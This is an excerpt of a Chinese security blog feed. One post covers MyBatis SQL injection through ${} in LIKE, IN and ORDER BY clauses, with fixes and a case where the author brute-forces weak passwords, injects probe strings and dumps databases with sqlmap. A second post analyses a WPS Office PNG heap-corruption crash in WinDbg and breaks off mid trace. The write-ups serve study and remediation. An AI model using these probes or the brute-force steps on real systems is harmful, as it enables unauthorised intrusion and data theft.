<p>那么用$代替#来描述参数会发生什么？</p><p>这种情况下，框架会直接把变量拼接到SQL语句当中，不会做其他的处理。就相当于直接字符串拼接SQL语句。</p><p>综上：使用#格式的语法，框架会创建预处理语句属性并安全地设置值，这样做安全，迅速，通常也是首选做法。然而有时只是想直接在SQL语句中插入一个不改变的字符串。比如，像ORDER BY,可以这样来使用: ORDER BY S{columnName}。这里MyBatis不会修改或转义字符串。但显然，这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的SQL注入攻击，</p><p>0X03 误用场景</p><p>通过上部分的讨论，我们知道使用#符号，Mybatis会进行预编译来处理参数，这样可以有效的避免SQL注入。</p><p>那么假如所有人都正确使用了#，也就不存在安全问题了。事实却恰恰相反，总有错误的用法，所以咱们才不会失业。</p><p>在程序中，如order by字段、表名等，是无法使用预编译语句的，在like参数、in参数、order by这种尝试用拼接逻辑的场景下，开发同学总会给系统留下一点彩蛋。所以在实际测试当中，能聚焦这方面，有针对性的进行漏洞的挖掘，才可以达到事倍功半的效果。</p><p>1、 like参数注入</p><p>错误写法示例：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsiBde58.jpg" alt="img" style="zoom:50%;"> <p>正确写法</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsvyNv3H.jpg" alt="img" style="zoom:50%;"> <p>对于Oracle可以通过’%’||’#param#’||’%’避免；</p><p>对于MySQL可以通过CONCAT(‘%’,#param#,’%’)避免；</p><p>对于MSSQL中通过’%’+#param#+’% 。</p><p>2 、in参数的SQL注入</p><p>错误写法示例：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYxgZ05.jpg" alt="img" style="zoom:50%;"> <p>正确写法</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpscRshyZ.jpg" alt="img" style="zoom:50%;"> <p>3、Order by SQL注入</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsVualOA.jpg" alt="img" style="zoom:50%;"> <p>因为预编译机制只能处理查询参数，此处显然不是查询参数，是一种错误的写法，因此order by位置的参数需要开发人员自己处理。所以只能使用$去拼接：</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsFLmRAr.jpg" alt="img" style="zoom:50%;"> <p>针对这种情况要在代码中做过滤、使用转义等方式处理字符，避免改变SQL逻辑。</p><p>其实也可以在xml中处理，用if去判断，这样就显得比较硬编码，sql语句会增加较多，显得臃肿，不便阅读。</p><p>通过上面的分析，我们了解到使用了mybatis框架容易误用的地方，可以有针对性的对部分功能展开渗透测试。</p><p>0X04 真实案列</p><p>某单位系统登陆页面未做验证码验证，进一步验证发现未对失败次数做限制，存在可爆破漏洞。同时是服务单位客户系统，存在弱密码可能极大。对于弱密码是有着永远说不完的话题，正好可以利用一波。</p><p>通过前期的信息收集，针对性制作弱密码字典，开始爆破行动。</p><p>反复尝试了几次，发现账户、密码正确，成功登陆系统。</p><p>接下来针对系统作进一步的渗透测试，因为有mybatis框架，我们只需要针对性测试上文总结的几处场景：</p><p>系统存在多处查询功能，查询用户名，会用like方式，猜测此处存在sql注入。</p><p>抓包手动测试：</p><p>‘ or ‘1’=‘0</p><p>‘ and ‘1’=‘1</p><p>返回结果明显不同，存在sql注入。</p><p>直接测模糊查询功能模块，得到多枚SQL注入。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsIZq2D9.jpg" alt="img"> </p><p>Sqlmap结果，Oracle数据库，3个库。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wps7EWkhy.jpg" alt="img" style="zoom:50%;"> <p>通过源代码进行修复</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsdraGDp.jpg" alt="img" style="zoom:50%;"> <p>我们前面提到like参数场景下的修复方式，如上图在LIKE后面跟 ‘%’||#{字段名}||’%’即可修复。</p><p>作为小白一次完整的mybatis框架sql注入针对性渗透测试与修复结束，望大佬们勿喷，请指点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mybatis框架sql注入针对性渗透测试与修复&lt;/p&gt;
&lt;p&gt;0X00背景&lt;/p&gt;
&lt;p&gt;在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Sql注入" scheme="http://www.ol4three.com/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mybatis" scheme="http://www.ol4three.com/tags/Mybatis/"/>
    
  </entry>
  
  <entry>
    <title>金山WPS Office远程堆损坏漏洞</title>
    <link href="http://www.ol4three.com/2020/09/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/%E9%87%91%E5%B1%B1WPS-Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/09/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/%E9%87%91%E5%B1%B1WPS-Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-12T18:11:24.000Z</published>
    <updated>2020-09-12T18:12:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>WPS Office是由Microsoft珠海的中国软件开发商金山软件开发的办公套件，适用于Microsoft Windows，macOS，Linux，iOS和Android。WPS Office由三个主要组件组成：WPS Writer，WPS Presentation和WPS Spreadsheet。个人基本版本可以免费使用。WPS Office软件中存在一个远程执行代码漏洞，是当Office软件在分析特制Office文件时不正确地处理内存中的对象时引起的。成功利用此漏洞的攻击者可以在当前用户的上下文中运行任意代码。故障可能会导致拒绝服务。漏洞产品WPS Office，影响版本11.2.0.9453。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在WPS Office中用于图像格式解析的Qt模块中发现堆损坏。嵌入WPS office的特制图像文件可能会触发此漏洞。打开特制的文档文件时，触发访问冲突。EDX指向数组的指针，而EAX是指向数组的索引。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(c50.b4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;006f1c48 ecx&#x3D;cd2aefbc edx&#x3D;cd2c6f80 esi&#x3D;2ed7ae18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;006f1b44 ebp&#x3D;006f1b44 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00210202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure><p>崩溃是如何触发的？让我们看一下PNG标头格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00029E30  FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44  ÿ‰PNG........IHD</span><br><span class="line">00029E40  52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A  R...€...Æ.......</span><br><span class="line">00029E50  27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98  &#39;ü....gAMA..±ˆ•˜</span><br><span class="line">00029E60  F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00  ô¦...0PLTE...€..</span><br><span class="line">00029E70  00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80  .€.€€...€€.€.€€€</span><br><span class="line">00029E80  80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00  €€ÀÀÀÿ...ÿ.ÿÿ...</span><br><span class="line">00029E90  FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00  ÿÿ.ÿ.ÿÿÿÿÿ&#123;.±Ä..</span><br></pre></td></tr></table></figure><p>从偏移量0x29E31开始-0x29E34是PNG文件格式的签名标头。PNG头文件的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNG signature --&gt; IHDR --&gt; gAMA --&gt; PLTE --&gt; pHYs --&gt; IDAT --&gt; IEND</span><br></pre></td></tr></table></figure><p>在这种情况下，当WPS Office Suite中使用的QtCore库解析PLTE结构并触发堆破坏时，该漏洞位于Word文档中的嵌入式PNG文件中。在偏移量0x29E82到0x29E85处，调色板的解析失败，从而触发了堆中的内存损坏。崩溃触发之前的堆栈跟踪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71</span><br><span class="line">01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b</span><br><span class="line">04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8</span><br><span class="line">05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325</span><br><span class="line">08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br></pre></td></tr></table></figure><p>在QtCore4解析嵌入式图像之前，我们可以看到来自KSO模块的最后一次调用，试图处理图像kso！GdiDrawHoriLineIAlt。使用IDA Pro分解应用程序来分析发生异常的功能。最后的崩溃路径如下（WinDBG结果）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure><p>在IDA Pro中打开时，我们可以按以下方式反汇编该函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:67353315                 push    ebp</span><br><span class="line">.text:67353316                 mov     ebp, esp</span><br><span class="line">.text:67353318                 movzx   eax, byte ptr [ecx+edx]  ; crash here</span><br><span class="line">.text:6735331C                 mov     ecx, [ebp+arg_0]</span><br><span class="line">.text:6735331F                 mov     edx, [ecx]</span><br><span class="line">.text:67353321                 mov     eax, [edx+eax*4+10h]</span><br><span class="line">.text:67353325                 mov     ecx, eax</span><br></pre></td></tr></table></figure><p>使用故障转储中的信息，我们知道应用程序在0x67353321（移动eax，[edx + eax * 4 + 10h]）处触发了访问冲突。我们可以看到EAX寄存器由0xc0值控制。因此，从这里我们可以根据导致异常的指令对寄存器的状态进行一些假设。需要注意的重要一点是，在发生异常之前，我们可以看到ECX（0xc0）中包含的值被写入到以下指令所定义的任意位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+arg_0]</span><br></pre></td></tr></table></figure><p>此外，我们注意到，在我们的故障指令之外，EBP的偏移量存储在ECX寄存器中。我们在前面提到的指令（偏移量为0x6ba1331c）上设置了一个断点，以观察内存。断点触发后，我们可以看到第一个值c45adfbc引用了另一个指针，该指针应该是指向数组的指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 0 hit</span><br><span class="line">eax&#x3D;0000000f ebx&#x3D;004f1b40 ecx&#x3D;d3544100 edx&#x3D;0000001c esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba1331c esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a3:</span><br><span class="line">6ba1331c 8b4d08          mov     ecx,dword ptr [ebp+8] ss:002b:004f1a3c&#x3D;c45adfbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ebp+8</span><br><span class="line">004f1a3c  c45adfbc 00000048 00000000 6f13830f  ..Z.H..........o</span><br><span class="line">004f1a4c  004f5cc8 00000000 00000000 00000000  .\O.............</span><br><span class="line">004f1a5c  00000000 004f65a0 004f662c 00000000  .....eO.,fO.....</span><br><span class="line">004f1a6c  779eae8e 00000000 00000001 3f800000  ...w...........?</span><br><span class="line">004f1a7c  3f800000 3f31e4f8 3f800000 3f800000  ...?..1?...?...?</span><br><span class="line">004f1a8c  3f800000 3f31e4f8 3f800000 3de38800  ...?..1?...?...&#x3D;</span><br><span class="line">004f1a9c  3de38800 3d9e1c8a 3c834080 004f3c00  ...&#x3D;...&#x3D;.@.&lt;.&lt;O.</span><br><span class="line">004f1aac  4101c71c 6ba13315 3f800000 4081c71c  ...A.3.k...?...@</span><br></pre></td></tr></table></figure><p>从c45adfbc观察内存引用，发现另一个指针。第一个值ab69cf80始终表示为指向它所引用的任何地方的指针。指针ab69cf80基本上是我们指针的索引数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dc c45adfbc</span><br><span class="line">c45adfbc  ab69cf80 d3544100 00000003 00000280  ..i..AT.........</span><br><span class="line">c45adfcc  0000055a 00000012 c0c0c0c0 1c3870e2  Z............p8.</span><br><span class="line">c45adfdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">c45adfec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">c45adffc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">c45ae00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">c45ae02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ab69cf80</span><br><span class="line">ab69cf80  00000001 0000001c 00000010 00000001  ................ &#x2F;&#x2F; 0000001c is overwritten in the register EDX and EDI before we trigger crash</span><br><span class="line">ab69cf90  ff000000 ff800000 ff008000 ff808000  ................ </span><br><span class="line">ab69cfa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">ab69cfb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................ &#x2F;&#x2F; ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX</span><br><span class="line">ab69cfc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">ab69cfd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cfe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">ab69cff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure><p>因为我们知道崩溃的路径，所以我们可以使用下面的命令简单地设置一个断点。该命令将获得指针值“ edx + eax * 4 + 10”，并检查其是否满足0xc0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bp 6ba13321 &quot;.if (poi(edx+eax*4+10) &#x3D;&#x3D; 0xc0) &#123;&#125; .else &#123;gc&#125;&quot;</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;004f1b40 ecx&#x3D;c45adfbc edx&#x3D;ab69cf80 esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290&#x3D;????????</span><br></pre></td></tr></table></figure><p>如果观察堆栈，可以看到以下执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">004f1a3c c45adfbc </span><br><span class="line">004f1a40 00000048 </span><br><span class="line">004f1a44 00000000 </span><br><span class="line">004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f</span><br><span class="line">004f1a4c 004f5cc8 </span><br><span class="line">004f1a50 00000000 </span><br><span class="line">004f1a54 00000000 </span><br><span class="line">004f1a58 00000000 </span><br><span class="line">004f1a5c 00000000 </span><br><span class="line">004f1a60 004f65a0 </span><br><span class="line">004f1a64 004f662c </span><br><span class="line">004f1a68 00000000 </span><br><span class="line">004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e</span><br></pre></td></tr></table></figure><p>如果我们反汇编6ba3cb98，则可以看到以下反汇编代码。真正的根本原因在于此代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h]</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch]</span><br><span class="line">6ba3cb92 52              push    edx</span><br><span class="line">6ba3cb93 8bd7            mov     edx,edi</span><br><span class="line">6ba3cb95 ff5580          call    dword ptr [ebp-80h]</span><br><span class="line">6ba3cb98 8b4e7c          mov     ecx,dword ptr [esi+7Ch]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C pseudo code</span><br><span class="line"></span><br><span class="line">grad &#x3D; *(&amp;ptr_grad);</span><br><span class="line">if ( grad &gt; 0.0099999998 )</span><br><span class="line">&#123;</span><br><span class="line">   input_value &#x3D; grad_size(check, size, input);</span><br><span class="line">   ptr_grad &#x3D; *(input);</span><br><span class="line">   ... cut here ...</span><br></pre></td></tr></table></figure><p>我们在6ba3cb89地址上设置断点，并观察ESI + 0xB4，我们可以看到一个指针指向另一个位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;00793938 esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb89 esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65:</span><br><span class="line">6ba3cb89 8b96b4000000    mov     edx,dword ptr [esi+0B4h] ds:002b:cb07decc&#x3D;cf69afbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc esi+0B4h</span><br><span class="line">cb07decc  cf69afbc c0c0c000 00000000 00000100  ..i.............</span><br><span class="line">cb07dedc  c0c0c0c0 00000000 00000000 00000000  ................</span><br><span class="line">cb07deec  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07defc  00000000 cf030fd0 00000000 00000000  ................</span><br><span class="line">cb07df0c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df1c  c0c0c0c0 00000000 3ff00000 00000000  ...........?....</span><br><span class="line">cb07df2c  00000000 00000000 00000000 00000000  ................</span><br><span class="line">cb07df3c  00000000 00000000 3ff00000 00000000  ...........?....</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure><p>从这里我们可以知道代码实际上没有从指针释放任何东西。一旦移至EDX，EDX将保留指向索引数组的指针：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">eax&#x3D;00000000 ebx&#x3D;00791878 ecx&#x3D;00000005 edx&#x3D;cf69afbc esi&#x3D;cb07de18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba3cb8f esp&#x3D;00791780 ebp&#x3D;00791870 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b:</span><br><span class="line">6ba3cb8f 8b4df4          mov     ecx,dword ptr [ebp-0Ch] ss:002b:00791864&#x3D;d1326100</span><br><span class="line"></span><br><span class="line">0:000&gt; dc cf69afbc</span><br><span class="line">cf69afbc  c88baf80 d1326100 00000003 00000280  .....a2.........</span><br><span class="line">cf69afcc  0000055f 00000012 c0c0c0c0 1c3870e2  _............p8.</span><br><span class="line">cf69afdc  40ad870e 1c3870e2 40ad870e 00000000  ...@.p8....@....</span><br><span class="line">cf69afec  00000000 c0c0c0c1 6c1d12c0 00000000  ...........l....</span><br><span class="line">cf69affc  c0c0c0c0 ???????? ???????? ????????  ....????????????</span><br><span class="line">cf69b00c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b01c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line">cf69b02c  ???????? ???????? ???????? ????????  ????????????????</span><br><span class="line"></span><br><span class="line">0:000&gt; dc c88baf80</span><br><span class="line">c88baf80  00000001 0000001c 00000010 00000001  ................</span><br><span class="line">c88baf90  ff000000 ff800000 ff008000 ff808000  ................</span><br><span class="line">c88bafa0  ff000080 ff800080 ff008080 ff808080  ................</span><br><span class="line">c88bafb0  ffc0c0c0 ffff0000 ff00ff00 ffffff00  ................</span><br><span class="line">c88bafc0  ff0000ff ffff00ff ff00ffff ffffffff  ................</span><br><span class="line">c88bafd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88bafe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br><span class="line">c88baff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................</span><br></pre></td></tr></table></figure><p>崩溃后的堆栈跟踪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kvL</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8</span><br><span class="line">01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74</span><br><span class="line">02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b</span><br><span class="line">05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8</span><br><span class="line">06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">08 012f67b4 